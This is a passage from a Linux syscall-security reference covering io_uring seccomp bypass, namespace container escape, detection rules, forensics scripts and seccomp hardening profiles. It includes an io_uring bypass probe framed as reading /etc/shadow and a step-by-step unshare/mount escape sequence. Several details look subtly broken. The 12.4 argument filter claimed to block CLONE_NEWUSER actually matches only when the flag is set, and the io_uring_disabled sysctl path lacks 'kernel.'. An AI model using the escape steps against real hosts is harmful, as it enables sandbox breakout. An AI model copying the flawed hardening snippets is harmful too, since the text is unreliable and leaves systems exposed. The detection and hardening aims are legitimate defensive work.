Seccomp filters inspect syscalls at the `entry_SYSCALL_64` dispatch point. The `io_uring` subsystem was designed to perform I/O operations inside the kernel worker context (`io-wq` threads) without re-entering the syscall dispatch path for each operation. This means operations submitted via `io_uring` SQEs — `openat`, `read`, `write`, `connect`, `sendmsg`, `recvmsg`, `close`, `statx`, and many others — execute in kernel context without triggering seccomp filters.

**Impact on container security.** Docker's default seccomp profile blocks approximately 44 syscalls. A container process that can call `io_uring_setup` (NR 425), `io_uring_enter` (NR 426), and `io_uring_register` (NR 427) can perform file I/O, network I/O, and other operations via SQE submission without any of those operations being evaluated by the seccomp filter. This effectively nullifies the seccomp sandbox for I/O-related restrictions.

Concrete bypass example — reading `/etc/shadow` from a container with seccomp blocking `openat`:

```python
#!/usr/bin/env python3
"""io_uring seccomp bypass — open and read a file via io_uring
when the seccomp filter blocks direct openat/read syscalls.

Requires: python3 with ctypes, kernel >= 5.6, io_uring not disabled.
This is a detection-engineering reference; the technique is well-documented
in io_uring security literature (Jens Axboe, 2022 kernel discussions).
"""
import ctypes
import ctypes.util
import os
import struct

# io_uring constants
IORING_SETUP_SQPOLL  = 1 << 1
IORING_OP_OPENAT     = 18
IORING_OP_READ       = 22
IORING_OP_CLOSE      = 19
SQE_SIZE  = 64
CQE_SIZE  = 16
AT_FDCWD  = -100

libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)

def io_uring_setup(entries, params_buf):
    """NR 425 on x86_64"""
    return libc.syscall(425, entries, params_buf)

def io_uring_enter(fd, to_submit, min_complete, flags, sig, sig_sz):
    """NR 426 on x86_64"""
    return libc.syscall(426, fd, to_submit, min_complete, flags, sig, sig_sz)

# Minimal demo: if io_uring_setup succeeds, the seccomp bypass surface exists.
# Full SQE construction follows the io_uring ABI; omitted for brevity
# since the kernel-level mechanics are identical to the C exploit in §4.
print("[*] Attempting io_uring_setup from seccomp-filtered context...")
params = bytearray(120)  # struct io_uring_params, zero-initialized
params_buf = (ctypes.c_char * 120).from_buffer(params)
ring_fd = io_uring_setup(8, params_buf)
if ring_fd >= 0:
    print(f"[+] io_uring ring fd={ring_fd} — seccomp bypass surface available")
    os.close(ring_fd)
else:
    print(f"[-] io_uring_setup blocked (errno={ctypes.get_errno()})")
```

**Mitigations.** Block `io_uring_setup` in the seccomp profile (Docker added this to the default profile starting with Docker 20.10.21 and Moby commit 980e28e, but older installations and custom profiles may not include it). Alternatively, set `io_uring_disabled=2` system-wide via sysctl. Kubernetes pod security admission can enforce this via a required seccomp profile that denies NR 425–427.

### 9.5 Namespace escape through unfiltered syscalls

User namespaces create isolated capability sets: a process may have `CAP_SYS_ADMIN` inside a user namespace but no capabilities in the init namespace. Several syscalls behave differently depending on namespace context, and a misconfigured seccomp filter that allows namespace-sensitive syscalls can enable privilege escalation:

- **`unshare(CLONE_NEWUSER)`**: creates a new user namespace where the caller gains full capabilities. If the seccomp profile does not block `unshare` with `CLONE_NEWUSER`, a sandboxed process can escalate to `CAP_SYS_ADMIN` within the new namespace and then exploit kernel code paths that check capabilities against the current namespace (e.g., `mount`, `pivot_root`, `bpf`).
- **`clone3` with `CLONE_NEWNS | CLONE_NEWUSER`**: the `clone3` syscall (NR 435) is newer and sometimes missed by seccomp profiles that only block the older `clone` (NR 56) and `unshare` (NR 272).
- **`setns` into an existing namespace**: if a sandboxed process can open `/proc/PID/ns/user` for a less-restricted namespace and call `setns`, it escapes the current namespace jail.

**Container escape sequence** (requires `clone3` + `unshare` + `mount` to be unfiltered):

```bash
# Step 1: Create a new user namespace with full capabilities
unshare --user --map-root-user /bin/sh -c '
    # Step 2: Mount a new procfs (requires CAP_SYS_ADMIN in user+mount NS)
    mkdir -p /tmp/proc_escape
    mount -t proc proc /tmp/proc_escape
    # Step 3: Read host process information via the new procfs
    cat /tmp/proc_escape/1/cmdline
    # Step 4: If mount namespace was also unshared, pivot_root for full escape
'
```

Detection for this sequence is covered in §10.1 below.

### 9.6 Cross-architecture syscall attack surface

Seccomp filters are architecture-specific: the syscall number for the same operation differs between x86_64 and AArch64. A filter written for x86_64 that is accidentally loaded on an AArch64 system (or vice versa) provides no protection.

**x86_64 vs AArch64 comparison for security-critical syscalls:**

| Operation | x86_64 NR | AArch64 NR | Notes |
|---|---|---|---|
| `ptrace` | 101 | 117 | Different number, same semantics |
| `io_uring_setup` | 425 | 425 | Same number (both added post-unification) |
| `io_uring_enter` | 426 | 426 | Same number |
| `userfaultfd` | 323 | 282 | Different number |
| `process_vm_readv` | 310 | 270 | Different number |
| `process_vm_writev` | 311 | 271 | Different number |
| `clone3` | 435 | 435 | Same number (unified) |
| `unshare` | 272 | 97 | Different number |
| `mount` | 165 | 40 | Different number |
| `execve` | 59 | 221 | Different number |

**Security implications.** The `arch` field in `struct seccomp_data` must always be checked first. On x86_64, a 64-bit process can issue `int 0x80` to invoke the IA-32 compatibility syscall table, where `execve` is NR 11 instead of NR 59. A seccomp filter that blocks NR 59 but does not check `arch` fails to block NR 11 via the compat path.

On AArch64, there is no equivalent compat-mode attack (AArch32 compat is disabled at the kernel level in most hardened configurations), but mixed-architecture container deployments (x86_64 host running AArch64 containers via QEMU user-mode emulation) present a risk: the seccomp filter must match the guest architecture, not the host.

**Best practice.** Always generate seccomp profiles per-architecture. Tools like `oci-seccomp-bpf-hook` and `security-profiles-operator` in Kubernetes produce architecture-specific profiles by tracing the target workload on the actual runtime architecture.

---

## 10. Syscall Detection Engineering Enhancement

### 10.1 Detection rules

The detection rules in this section complement (not duplicate) the Sigma rules in §4.6 and the ptrace detection in §7.7. Each rule targets a distinct attack pattern.

**Rule 1: Container escape via clone3+unshare+mount sequence.**

```yaml
title: Potential container escape via namespace manipulation
id: b7c4e912-3a58-4d6f-b1e2-89f7c5d31a04
status: experimental
description: >
  Detects the clone3/unshare + mount sequence within a containerized process,
  indicating a potential namespace-based container escape attempt.
logsource:
    product: linux
    service: auditd
detection:
    clone_or_unshare:
        type: SYSCALL
        syscall:
            - clone3
            - unshare
        a0|contains:
            - '10000000'   # CLONE_NEWUSER (0x10000000)
    mount_follow:
        type: SYSCALL
        syscall: mount
    timeframe: 5s
    condition: clone_or_unshare | count() >= 1 and mount_follow | count() >= 1
    filter_known:
        exe:
            - /usr/bin/unshare
            - /usr/bin/systemd-nspawn
            - /usr/sbin/runc
level: critical
tags:
    - attack.privilege_escalation
    - attack.t1611
    - attack.t1053
```

**Rule 2: Cross-process memory write from non-debugger.**

```yaml
title: process_vm_writev from unexpected process
id: d4f8a123-7b92-4e5c-a3d1-6c89e2f47b50
status: experimental
description: >
  Detects process_vm_writev (NR 311) which writes into another process's
  address space. Legitimate use is rare outside debuggers and CRIU.
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: SYSCALL
        syscall: process_vm_writev
    filter_legitimate:
        exe:
            - /usr/bin/gdb
            - /usr/bin/lldb
            - /usr/sbin/criu
            - /usr/bin/criu
    condition: selection and not filter_legitimate
level: critical
tags:
    - attack.defense_evasion
    - attack.t1055
```

**Rule 3: eBPF program load from unprivileged context.**

```yaml
title: Unprivileged eBPF program loading
id: e5a91c34-8d67-4f2a-b9e3-7da0f3c58e61
status: experimental
description: >
  Detects bpf(BPF_PROG_LOAD) from processes without CAP_BPF or CAP_SYS_ADMIN.
  Unprivileged eBPF was historically used for kernel info leaks and exploits.
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: SYSCALL
        syscall: bpf
        a0: 5   # BPF_PROG_LOAD
    filter_root:
        uid: 0
    condition: selection and not filter_root
level: high
tags:
    - attack.privilege_escalation
    - attack.t1068
```

**Rule 4: Kernel module loading from containerized process.**

```yaml
title: Kernel module load from container
id: f6b02d45-9e78-4a3b-c0f4-8eb1a4d69f72
status: experimental
description: >
  Detects init_module or finit_module syscalls from processes inside a
  container (non-init PID namespace). Kernel modules loaded from containers
  execute in the host kernel with full privileges.
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: SYSCALL
        syscall:
            - init_module
            - finit_module
    condition: selection
level: critical
tags:
    - attack.persistence
    - attack.privilege_escalation
    - attack.t1547.006
```

**Rule 5: Suspicious io_uring SQE submission frequency.**

```yaml
title: High-frequency io_uring_enter indicating potential exploitation
id: a7c13e56-0f89-4b4c-d1a5-9fc2b5e70a83
status: experimental
description: >
  Detects io_uring_enter called at very high frequency from a single process,
  which may indicate io_uring exploitation (race conditions require rapid
  SQE submission) or seccomp bypass abuse. NOTE: raw Sigma cannot express
  per-PID rate thresholds — this rule requires SIEM-level correlation
  (e.g., Splunk tstats, Elastic threshold rule, or Chronicle YARA-L).
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: SYSCALL
        syscall: io_uring_enter
    timeframe: 1s
    condition: selection | count(pid) > 100
level: medium
tags:
    - attack.defense_evasion
    - attack.t1068
```

**Rule 6: ptrace SETREGS on non-descendant (syscall redirection indicator).**

```yaml
title: ptrace register manipulation on non-child process
id: b8d24f67-1a90-4c5d-e2b6-0ad3c6f81b94
status: experimental
description: >
  Detects PTRACE_SETREGS (a0=13) targeting a process that is not a descendant
  of the tracer. This is the core primitive for ptrace-based syscall redirection
  and code injection attacks.
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: SYSCALL
        syscall: ptrace
        a0:
            - 13    # PTRACE_SETREGS
            - 25    # PTRACE_SETREGSET (PTRACE_SETREGSET = 0x19 = 25)
    filter_debuggers:
        exe:
            - /usr/bin/gdb
            - /usr/bin/strace
            - /usr/bin/lldb
    condition: selection and not filter_debuggers
level: high
tags:
    - attack.privilege_escalation
    - attack.t1055.008
```

**Rule 7: Seccomp filter modification via prctl from child process.**

```yaml
title: Seccomp filter installation in already-sandboxed process
id: c9e35a78-2ba1-4d6e-f3c7-1be4d7a92c05
status: experimental
description: >
  Detects prctl(PR_SET_SECCOMP) or seccomp() syscall in a process that
  already has seccomp filters active. While filter stacking is by design
  (filters can only become stricter), monitoring this reveals processes
  attempting to modify their sandbox configuration.
logsource:
    product: linux
    service: auditd
detection:
    selection_prctl:
        type: SYSCALL
        syscall: prctl
        a0: 22    # PR_SET_SECCOMP
    selection_seccomp:
        type: SYSCALL
        syscall: seccomp
    condition: selection_prctl or selection_seccomp
level: low
tags:
    - attack.defense_evasion
    - attack.t1562.001
```

### 10.2 Auditd rule optimization for high-volume syscall filtering

Auditing every syscall via `-a always,exit -S all` is impractical — the volume can exceed 100,000 events/second on a busy system, overwhelming `auditd` and its downstream consumers.

**Targeted audit rules for this chapter's attack surface:**

```bash
# /etc/audit/rules.d/50-syscall-security.rules

# io_uring — alert on ring creation and entry (low-volume on most systems)
-a always,exit -F arch=b64 -S io_uring_setup -S io_uring_enter -S io_uring_register -k io_uring_ops

# ptrace — capture attach, seize, and register manipulation
-a always,exit -F arch=b64 -S ptrace -F a0=16 -k ptrace_attach       # PTRACE_ATTACH
-a always,exit -F arch=b64 -S ptrace -F a0=16902 -k ptrace_seize     # PTRACE_SEIZE
-a always,exit -F arch=b64 -S ptrace -F a0=13 -k ptrace_setregs      # PTRACE_SETREGS
-a always,exit -F arch=b64 -S ptrace -F a0=12 -k ptrace_getregs      # PTRACE_GETREGS

# Cross-process memory access
-a always,exit -F arch=b64 -S process_vm_readv -S process_vm_writev -k xprocess_mem

# userfaultfd — kernel exploit primitive
-a always,exit -F arch=b64 -S userfaultfd -k userfaultfd_create

# Namespace manipulation — container escape indicators
-a always,exit -F arch=b64 -S unshare -k namespace_unshare
-a always,exit -F arch=b64 -S clone3 -F a0\&0x10000000=0x10000000 -k clone3_newuser
-a always,exit -F arch=b64 -S setns -k namespace_setns

# Kernel module loading
-a always,exit -F arch=b64 -S init_module -S finit_module -S delete_module -k kmod_ops

# eBPF program operations
-a always,exit -F arch=b64 -S bpf -k bpf_ops
```

**Volume management strategies:**

1. **Filter at the auditd level** using `-F` field filters (as above) to reduce events to security-relevant subset.
2. **Use `auditd` rate limiting**: set `rate_limit = 5000` in `/etc/audit/auditd.conf` to prevent log flooding (events exceeding the rate are dropped with a rate-limit message).
3. **Ship to a streaming pipeline**: use `audisp-remote` or `go-audit` (Slack's auditd replacement) to send events to Kafka/NATS rather than writing to local disk.
4. **Complement with eBPF**: for syscalls that generate high volume even with filters (e.g., `bpf` in BPF-heavy observability stacks), use eBPF-based monitoring that can apply in-kernel predicates and emit only anomalous events.

### 10.3 eBPF-based syscall monitoring: Tetragon and Falco policies

The raw eBPF program in §8.3 demonstrates the low-level mechanism. Production deployments use policy engines that abstract BPF program generation behind declarative rules.

**Tetragon TracingPolicy — detect userfaultfd + ioctl TOCTOU combination:**

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: userfaultfd-toctou-detector
spec:
  kprobes:
    - call: "__x64_sys_userfaultfd"
      syscall: true
      args:
        - index: 0
          type: int
      selectors:
        - matchActions:
            - action: Post
              rateLimit: "1m"
            - action: NotifyEnforcer
              argError: -1   # optionally block
          matchCapabilities:
            - type: Effective
              operator: NotIn
              values:
                - "CAP_SYS_PTRACE"
    - call: "__x64_sys_ioctl"
      syscall: true
      args:
        - index: 0
          type: fd
        - index: 1
          type: int
      selectors:
        - matchPIDs:
            - operator: NotIn
              followForks: true
              isNamespacePID: false
              values: []    # populated dynamically
          matchActions:
            - action: Post
```

**Falco rule — detect io_uring from container:**

```yaml
- rule: io_uring syscall in container
  desc: >
    Detect io_uring_setup within a container. io_uring bypasses seccomp
    filters and should be blocked in containerized workloads.
  condition: >
    evt.type = io_uring_setup
    and container.id != host
  output: >
    io_uring_setup called in container
    (user=%user.name command=%proc.cmdline container=%container.name
     image=%container.image.repository pid=%proc.pid)
  priority: CRITICAL
  tags: [container, syscall, defense_evasion]

- rule: process_vm_writev from non-debugger
  desc: >
    Detect process_vm_writev from processes that are not known debuggers.
    This syscall writes directly into another process's address space.
  condition: >
    evt.type = process_vm_writev
    and not proc.name in (gdb, lldb, criu, strace)
  output: >
    process_vm_writev from unexpected process
    (user=%user.name command=%proc.cmdline pid=%proc.pid
     target_pid=%evt.arg.pid)
  priority: CRITICAL
  tags: [process, injection, t1055]
```

### 10.4 Syscall argument inspection for anomaly detection

Beyond syscall number monitoring, inspecting argument values reveals attack patterns invisible to number-only detection:

**ptrace request codes as attack indicators:**

| ptrace request (`a0`) | Decimal | Attack relevance |
|---|---|---|
| `PTRACE_ATTACH` | 16 | Initial attachment for injection |
| `PTRACE_SEIZE` | 16902 | Stealthier attachment (no SIGSTOP) |
| `PTRACE_POKEDATA` | 5 | Memory write (code injection) |
| `PTRACE_POKETEXT` | 4 | Code write (same as POKEDATA on Linux) |
| `PTRACE_SETREGS` | 13 | Register manipulation (syscall redirect) |
| `PTRACE_SYSCALL` | 24 | Syscall-level interception |
| `PTRACE_CONT` | 7 | Resume after manipulation |

**mmap flags as exploit indicators:** `PROT_READ | PROT_WRITE | PROT_EXEC` (0x7) in the `prot` argument to `mmap` creates an RWX mapping — the standard primitive for shellcode injection. Detection: audit `mmap` with `-F a2&0x7=0x7`.

**clone3 flags for namespace escape:** the `clone_args.flags` field containing `CLONE_NEWUSER` (0x10000000) signals user namespace creation. Combined with `CLONE_NEWNS` (0x20000), this is the prerequisite for mount-namespace-based container escape.

---

## 11. Syscall Forensics

### 11.1 Syscall trace reconstruction from audit logs

Audit logs record individual syscall events but do not inherently reconstruct the control flow. Forensic analysis requires correlating events by PID, timestamp, and session ID (`ses` field) to rebuild the syscall sequence.

**Reconstruction workflow:**

```bash
# Extract all syscalls from a specific process during an incident window
ausearch --start "2025-06-15 14:30:00" --end "2025-06-15 14:35:00" \
    --pid 31337 --syscall --format text > /tmp/pid31337_syscalls.txt

# Correlate by session — captures the full session including fork'd children
ausearch --start "2025-06-15 14:30:00" --end "2025-06-15 14:35:00" \
    --session 42 --format text > /tmp/session42_full.txt

# Extract a timeline of security-relevant syscalls
aureport --syscall --start "2025-06-15 14:30:00" --end "2025-06-15 14:35:00" \
    | grep -E "(ptrace|io_uring|userfaultfd|process_vm|clone3|unshare|mount|execve)"
```

**Key fields for forensic correlation:**

| Audit field | Forensic purpose |
|---|---|
| `a0`–`a3` | Syscall arguments (first four) |
| `exit` | Return value (success/failure and error code) |
| `ppid` | Parent PID — trace process lineage |
| `ses` | Session ID — group related activity |
| `comm` | Command name at time of syscall |
| `exe` | Full path of executable |
| `key` | Audit rule key — identifies which detection rule matched |
| `subj` | SELinux context (if enabled) |

### 11.2 io_uring operation forensics: SQE/CQE ring analysis from memory dumps

When investigating a suspected io_uring exploit, the in-memory ring structures contain the sequence of operations the attacker submitted.

**Locating io_uring rings in a memory dump.** The `io_uring` ring file descriptors appear in `/proc/PID/fdinfo/FD`:

```bash
# On a live system — enumerate io_uring instances
for pid in /proc/[0-9]*; do
    for fd in "$pid"/fd/*; do
        fdinfo="$pid/fdinfo/$(basename "$fd")"
        if grep -q 'io_uring' "$fdinfo" 2>/dev/null; then
            echo "PID=$(basename "$pid") FD=$(basename "$fd")"
            cat "$fdinfo"
        fi
    done
done 2>/dev/null
```

The `fdinfo` output for an io_uring fd includes `SqSize`, `CqSize`, `SqHead`, `SqTail`, `CqHead`, `CqTail`, and per-SQE details. On a memory dump, the rings are mmap'd regions accessible from the process's address space. The SQ ring starts at the offset returned by `io_uring_setup` in `io_sqring_offsets`, and each SQE is 64 bytes:

```c
/* SQE structure for forensic parsing */
struct io_uring_sqe {
    __u8  opcode;       /* IORING_OP_* — identifies the operation */
    __u8  flags;        /* IOSQE_* flags */
    __u16 ioprio;
    __s32 fd;           /* target file descriptor */
    union {
        __u64 off;      /* offset for positioned I/O */
        __u64 addr2;
    };
    union {
        __u64 addr;     /* buffer address or special value */
        __u64 splice_off_in;
    };
    __u32 len;          /* buffer length */
    /* ... flags, user_data, personality, etc. */
};
```

**Forensic interpretation.** Walk the SQE ring from `SqHead` to `SqTail`, decoding each `opcode` against the `IORING_OP_*` constants. A sequence of `IORING_OP_OPENAT` (18) + `IORING_OP_READ` (22) targeting sensitive paths reveals file exfiltration. Multiple `IORING_OP_TIMEOUT` (11) + `IORING_OP_TIMEOUT_REMOVE` (12) entries indicate the UAF race pattern from §4.5. `IORING_OP_PROVIDE_BUFFERS` (31) followed by `IORING_OP_RECV` (27) combined with rapid unregistration signals the CVE-2024-0582 exploitation pattern.

### 11.3 ptrace session forensic reconstruction

A ptrace-based attack leaves these forensic artifacts:

1. **Audit log entries** for `ptrace` syscall with varying `a0` values (ATTACH, GETREGS, SETREGS, POKEDATA, DETACH) from the same source PID targeting the same target PID.
2. **`/proc/PID/status`** — the `TracerPid` field is non-zero while the tracer is attached (cleared on detach).
3. **`/proc/PID/syscall`** — on a live system, shows the current syscall and arguments if the process is stopped.
4. **`/proc/PID/maps`** — new RWX mappings that appear during the tracing session indicate injected memory regions.
5. **Core dumps** — if the tracee crashes, the core dump contains the injected code and modified registers.

**Reconstruction script:**

```python
#!/usr/bin/env python3
"""Reconstruct a ptrace session from auditd logs.
Usage: ptrace_reconstruct.py <audit.log> <tracer_pid>
"""
import sys
import re
from collections import defaultdict

PTRACE_OPS = {
    0: "TRACEME", 1: "PEEKTEXT", 2: "PEEKDATA", 3: "PEEKUSER",
    4: "POKETEXT", 5: "POKEDATA", 6: "POKEUSER", 7: "CONT",
    8: "KILL", 9: "SINGLESTEP", 12: "GETREGS", 13: "SETREGS",
    16: "ATTACH", 17: "DETACH", 24: "SYSCALL",
    16896: "SETOPTIONS", 16897: "GETEVENTMSG",
    16898: "GETSIGINFO", 16899: "SETSIGINFO",
    16900: "GETREGSET", 16901: "SETREGSET", 16902: "SEIZE",
}

def reconstruct(logfile, tracer_pid):
    events = []
    pattern = re.compile(
        r'type=SYSCALL.*?pid=(\d+).*?syscall=101.*?a0=(\w+).*?a1=(\w+)'
    )
    with open(logfile) as f:
        for line in f:
            m = pattern.search(line)
            if m and m.group(1) == str(tracer_pid):
                op_code = int(m.group(2), 16)
                target = int(m.group(3), 16)
                op_name = PTRACE_OPS.get(op_code, f"UNKNOWN({op_code})")
                events.append((op_name, target))

    print(f"ptrace session from PID {tracer_pid}:")
    print(f"{'Operation':<20} {'Target PID':<12}")
    print("-" * 32)
    for op, tgt in events:
        print(f"{op:<20} {tgt:<12}")

    # Detect attack patterns
    ops = [e[0] for e in events]
    if "ATTACH" in ops and "SETREGS" in ops and "POKEDATA" in ops:
        print("\n[!] ATTACK PATTERN: Code injection (ATTACH+POKEDATA+SETREGS)")
    elif "ATTACH" in ops and "SETREGS" in ops and "SYSCALL" in ops:
        print("\n[!] ATTACK PATTERN: Syscall redirection (ATTACH+SYSCALL+SETREGS)")
    elif "ATTACH" in ops and "PEEKDATA" in ops and "DETACH" in ops:
        print("\n[!] PATTERN: Memory read (possible credential theft)")

if __name__ == "__main__":
    reconstruct(sys.argv[1], int(sys.argv[2]))
```

### 11.4 Seccomp filter extraction and analysis

A process's active seccomp filters can be dumped and disassembled for forensic or audit purposes.

**Extracting the BPF filter from a live process:**

```bash
# Method 1: /proc/PID/status shows seccomp mode
grep Seccomp /proc/$PID/status
# Seccomp:  2       (mode 2 = filter)
# Seccomp_filters: 3  (3 filters installed)

# Method 2: Use seccomp-tools to dump the actual BPF bytecode
# Install: gem install seccomp-tools
seccomp-tools dump -p $PID
```

`seccomp-tools` attaches to the process via ptrace, triggers a `prctl(PR_GET_SECCOMP)`, and reads the BPF program from kernel memory via `/proc/kcore` or `PTRACE_PEEKDATA` on the kernel stack. The output is the disassembled BPF filter:

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x06 0x00 0x40000000  if (A >= 0x40000000) goto 0010
 0004: 0x15 0x04 0x00 0x00000038  if (A == clone) goto 0009
 0005: 0x15 0x03 0x00 0x00000065  if (A == ptrace) goto 0009
 0006: 0x15 0x02 0x00 0x000001a9  if (A == io_uring_setup) goto 0009
 0007: 0x15 0x01 0x00 0x00000143  if (A == userfaultfd) goto 0009
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x00050001  return ERRNO(1)
 0010: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
```

**Forensic analysis of extracted filters:**

1. **Verify architecture check**: line 0000–0001 above validates `AUDIT_ARCH_X86_64`. A filter missing this check is vulnerable to arch-switching bypass.
2. **Identify allowed vs denied syscalls**: enumerate the allowed set and compare against the known-good policy for the workload.
3. **Check for `io_uring` coverage**: if NR 425–427 are not explicitly denied, the process has the seccomp bypass surface available.
4. **Evaluate default action**: the last instruction should be `KILL_PROCESS` or `ERRNO` for deny-by-default policies. `ALLOW` as default means the filter is an allowlist for logging, not a security boundary.

### 11.5 Syscall-based timeline reconstruction

For incident investigation, interleave syscall events with process events, network events, and file events into a unified timeline:

```bash
# Generate a unified timeline from multiple audit event types
ausearch --start "2025-06-15 14:00:00" --end "2025-06-15 15:00:00" \
    --format csv > /tmp/audit_raw.csv

# Extract key event types with timestamps
awk -F',' '
    /SYSCALL/ && /(ptrace|io_uring|userfaultfd|process_vm|clone3|unshare)/ {
        print $1, "SYSCALL", $0
    }
    /EXECVE/ { print $1, "EXECVE", $0 }
    /SOCKADDR/ { print $1, "NETWORK", $0 }
    /PATH/ && /shadow|passwd|sudoers/ { print $1, "SENSITIVE_FILE", $0 }
' /tmp/audit_raw.csv | sort -k1 > /tmp/incident_timeline.txt
```

The resulting timeline reveals the attack sequence: initial access (execve of exploit), privilege escalation (userfaultfd + ioctl for kernel exploit, or ptrace + setregs for process injection), persistence (module load or cron manipulation), and lateral movement (network connections post-escalation).

---

## 12. Syscall Hardening Reference

### 12.1 Seccomp profile generation from syscall traces

Generating seccomp profiles from runtime traces eliminates guesswork about which syscalls an application requires.

**Method 1: strace-based profiling.**

```bash
# Record all syscalls made during normal operation
strace -f -o /tmp/trace.log -e trace=all ./target_application --typical-workload

# Extract unique syscall names
grep -oP '^\[pid \d+\] \K\w+' /tmp/trace.log | sort -u > /tmp/syscalls_used.txt

# Alternatively, for syscall numbers:
strace -f -o /tmp/trace_nr.log -e raw=all ./target_application --typical-workload
```

**Method 2: bpftrace one-liner for production profiling.**

```bash
# Profile syscalls for a specific PID for 60 seconds — zero overhead on non-target
bpftrace -e '
    tracepoint:raw_syscalls:sys_enter /pid == $1/ {
        @syscalls[args.id] = count();
    }
    interval:s:60 { exit(); }
' -p $(pidof target_application)

# Output: map of syscall NR → invocation count
# Convert NRs to names via ausyscall or /usr/include/asm/unistd_64.h
```

**Method 3: OCI seccomp-bpf-hook for containers.**

```bash
# Automatically generate a seccomp profile for a container run
# Install: go install github.com/containers/oci-seccomp-bpf-hook@latest
podman run --annotation io.containers.trace-syscall="of:/tmp/profile.json" \
    --rm myimage:latest /entrypoint.sh --full-test

# The hook uses eBPF to trace syscalls and writes a JSON seccomp profile
cat /tmp/profile.json
```

The generated profile is a starting point. Review it for:

- Presence of `io_uring_setup`/`io_uring_enter` — remove unless the application genuinely uses io_uring.
- Presence of `ptrace` — remove unless the application is a debugger.
- Presence of `userfaultfd` — remove unless the application uses CRIU or QEMU.
- Presence of `clone3` with `CLONE_NEWUSER` — restrict unless the application creates user namespaces.

### 12.2 io_uring restriction

**System-wide disable via sysctl (§8.2 covers the basic setting; this subsection addresses operational detail):**

```bash
# Disable io_uring for unprivileged users (recommended for most servers)
echo 1 > /proc/sys/io_uring_disabled

# Disable io_uring entirely (recommended for hardened/security-critical systems)
echo 2 > /proc/sys/io_uring_disabled

# Persist across reboots
echo "io_uring_disabled = 2" >> /etc/sysctl.d/99-io-uring-disable.conf
```

**Per-container restriction via seccomp:**

```json
{
    "defaultAction": "SCMP_ACT_ALLOW",
    "syscalls": [
        {
            "names": ["io_uring_setup", "io_uring_enter", "io_uring_register"],
            "action": "SCMP_ACT_ERRNO",
            "errnoRet": 1,
            "comment": "Block io_uring to prevent seccomp bypass"
        }
    ]
}
```

**Kubernetes enforcement** via PodSecurity or security-profiles-operator:

```yaml
apiVersion: security-profiles-operator.x-k8s.io/v1beta1
kind: SeccompProfile
metadata:
  name: deny-io-uring
spec:
  defaultAction: SCMP_ACT_ALLOW
  syscalls:
    - action: SCMP_ACT_ERRNO
      errnoRet: 1
      names:
        - io_uring_setup
        - io_uring_enter
        - io_uring_register
```

### 12.3 ptrace restriction: Yama LSM configuration

The Yama LSM (§7) provides four `ptrace_scope` levels. Operational guidance for each:

| Scope | Value | Effect | When to use |
|---|---|---|---|
| Classic | 0 | Any process with same UID can ptrace any other | Never in production |
| Restricted | 1 | Only descendants can be traced | General-purpose servers |
| Admin-only | 2 | Only processes with `CAP_SYS_PTRACE` can trace | Security-sensitive workloads |
| No-attach | 3 | No process can call `PTRACE_ATTACH` (even root) | Maximum lockdown (breaks debuggers) |

```bash
# Set to admin-only (recommended for production)
echo 2 > /proc/sys/kernel/yama/ptrace_scope

# Persist
echo "kernel.yama.ptrace_scope = 2" >> /etc/sysctl.d/99-ptrace-restrict.conf
```

**`PTRACE_MODE_ATTACH_REALCREDS` vs `PTRACE_MODE_ATTACH_FSCREDS`.** Since Linux 4.5, the kernel distinguishes between real credentials and filesystem credentials for ptrace access checks. `PTRACE_MODE_ATTACH_REALCREDS` (used by `PTRACE_ATTACH` and `PTRACE_SEIZE`) checks the tracer's real UID/GID against the tracee's real, effective, and saved-set UIDs/GIDs. `PTRACE_MODE_ATTACH_FSCREDS` (used by `/proc/PID/mem` access and `process_vm_readv`) checks filesystem credentials. The distinction matters when a process has used `setfsuid`/`setfsgid` — the fscreds check uses the filesystem identity, not the real identity. For hardening, both checks are gated by Yama scope, so setting scope >= 2 restricts both modes.

### 12.4 Syscall allowlisting strategies for containers and sandboxes

**Deny-by-default with explicit allowlist (recommended):**

```json
{
    "defaultAction": "SCMP_ACT_ERRNO",
    "defaultErrnoRet": 1,
    "architectures": ["SCMP_ARCH_X86_64", "SCMP_ARCH_X86", "SCMP_ARCH_X32"],
    "syscalls": [
        {
            "names": [
                "read", "write", "close", "fstat", "lseek", "mmap",
                "mprotect", "munmap", "brk", "rt_sigaction",
                "rt_sigprocmask", "rt_sigreturn", "ioctl", "access",
                "pipe", "select", "sched_yield", "mremap", "msync",
                "mincore", "madvise", "dup", "dup2", "nanosleep",
                "getpid", "socket", "connect", "accept", "sendto",
                "recvfrom", "bind", "listen", "getsockname",
                "getpeername", "socketpair", "setsockopt",
                "getsockopt", "clone", "execve", "exit", "wait4",
                "kill", "fcntl", "flock", "fsync", "fdatasync",
                "getcwd", "chdir", "openat", "newfstatat", "futex",
                "set_robust_list", "get_robust_list", "epoll_create1",
                "epoll_ctl", "epoll_wait", "clock_gettime",
                "clock_getres", "exit_group", "set_tid_address",
                "arch_prctl", "prlimit64", "getrandom", "rseq",
                "clone3", "close_range", "epoll_pwait2"
            ],
            "action": "SCMP_ACT_ALLOW"
        }
    ]
}
```

This allowlist covers a typical Go or Rust HTTP server. Crucially absent: `ptrace`, `io_uring_setup`, `io_uring_enter`, `io_uring_register`, `userfaultfd`, `process_vm_readv`, `process_vm_writev`, `init_module`, `finit_module`, `mount`, `umount2`, `pivot_root`, `unshare` (with `CLONE_NEWUSER`), `setns`, `bpf`, `perf_event_open`, `kexec_load`, `kexec_file_load`.

**Argument-level filtering for nuanced control:**

```json
{
    "names": ["clone", "clone3"],
    "action": "SCMP_ACT_ALLOW",
    "args": [
        {
            "index": 0,
            "value": 268435456,
            "valueTwo": 268435456,
            "op": "SCMP_CMP_MASKED_EQ",
            "comment": "Block CLONE_NEWUSER (0x10000000)"
        }
    ]
}
```

This allows `clone`/`clone3` but only when the `CLONE_NEWUSER` flag is not set, preventing user namespace creation while allowing normal thread/process creation.

### 12.5 Kernel compilation options for syscall attack surface reduction
